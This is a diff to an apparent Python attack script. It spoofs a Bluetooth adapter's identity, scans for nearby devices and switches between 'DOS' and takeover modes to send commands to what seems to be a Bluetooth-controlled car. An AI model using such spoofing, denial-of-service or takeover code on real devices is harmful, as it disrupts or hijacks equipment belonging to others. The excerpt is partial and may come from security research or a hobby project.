@@ -29,7 +29,7 @@ def on_press(key):
         print("Mode has been changed to 'DOS'")
         mode = 4
 
-
+# Client stub
 def during_takeover():
     global client_socket
     global mode
@@ -50,16 +50,19 @@ proc = subprocess.Popen(['hciconfig', 'hci1', 'up'], stdout=subprocess.PIPE)
 time.sleep(1)
 proc = subprocess.Popen(['hciconfig', 'hci0', '-a'], stdout=subprocess.PIPE)
 out, err = proc.communicate()
-if "Broadcom" in out:
+adapter = raw_input("Which bluetooth adapter needs to be spoofed? ")
+#if "Broadcom" in out:
     # Bluetooth adapter with modifyable MAC address is at hci0
-    adapter = 'hci0'
-else:
+#    adapter = 'hci0'
+#else:
     # Bluetooth adapter is at hci1
-    adapter = 'hci1'
+#    adapter = 'hci1'
 
 # Scan for discoverable bluetooth devices
-print("Performing inquiry...")
-nearby_devices = discover_devices(lookup_names = True)
+nearby_devices = {}
+while len(nearby_devices) == 0:
+    print("Performing inquiry...")
+    nearby_devices = discover_devices(lookup_names = True)
 print("found %d devices" % len(nearby_devices))
 num = 1
 for name, addr in nearby_devices:
@@ -160,6 +163,7 @@ while True:
 
         # Take over mode
         if mode == 3:
+            thread = Thread(target = during_takeover, args = ())
             print("Entering mode 3 after user sends next command")
             data = 's'
             car_socket.send(data)
